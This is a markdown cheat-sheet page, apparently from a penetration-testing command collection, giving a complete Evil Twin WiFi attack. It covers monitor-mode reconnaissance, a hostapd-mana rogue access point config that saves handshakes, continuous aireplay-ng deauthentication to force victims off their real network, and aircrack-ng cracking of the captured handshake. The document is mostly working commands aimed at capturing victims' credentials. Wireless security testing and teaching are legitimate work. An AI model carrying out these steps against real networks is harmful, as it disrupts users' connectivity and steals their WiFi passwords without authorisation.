---
title: Evil Twin Attack
category: wireless
subcategory: sub-04
os: linux
command: sudo hostapd-mana NinjaWiFi-mana.conf
tools: airmon-ng, wireshark, hostapd-mana, aireplay-ng
---

## Evil Twin Attack

Evil Twin is an attack that creates a fake access point imitating a legitimate network. When the victim connects to our AP instead of the real one, we can capture their credentials.

**To perform this attack, you must have two WiFi interfaces.**

### Gathering Network Information

First, we need to gather information about the target network:

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng -w file --output-format pcap wlan0mon
```

We can analyze the collected data in Wireshark:

```bash
wireshark file-01.pcap
```

Wireshark filters:

```
wlan.fc.type_subtype == 0x08
wlan.fc.type_subtype == 0x08 && wlan.ssid == "NinjaWiFi"
```

### Required Information

We need to determine:

- ESSID (network name)
- BSSID (MAC access pointa)
- Encryption type: WPA or WPA2
- Cipher: TKIP or CCMP
- Channel

### Hostapd-mana configuration

Create the fake AP configuration file:

```bash
mousepad NinjaWiFi-mana.conf
```

File contents:

```
interface=wlan0
ssid=NinjaWiFi
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/ubuntu/ninja.hccapx
```

**Explanation:**

- `hw_mode=g` – 2.4 GHz band (for 5 GHz, use `hw_mode=a`)
- `wpa=3` – WPA1 + WPA2 simultaneously (mixed mode) or `wpa=1`, `wpa=2`
- `wpa_pairwise=TKIP (or) CCMP` – Cipher for WPA1
- `rsn_pairwise=TKIP (or) CCMP` – Cipher for WPA2
- `mana_wpaout=` – Path to save captured handshakes

### Launching the attack

Launch the fake AP:

```bash
sudo hostapd-mana NinjaWiFi-mana.conf
```

In a second terminal, prepare the second card for deauthentication:

```bash
sudo airmon-ng start wlan1 1
```

Force clients to disconnect from the real network:

```bash
sudo aireplay-ng -0 0 -a BS:SI:D0:BS:SI:D0 wlan1mon
```

The `-0 0` parameter indicates continuous deauthentication. Clients can connect to our stronger signal after disconnecting.

### Password Cracking

After capturing the handshake, crack the password:

```bash
aircrack-ng ninja.hccapx -e NinjaWiFi -w /usr/share/john/password.lst
```
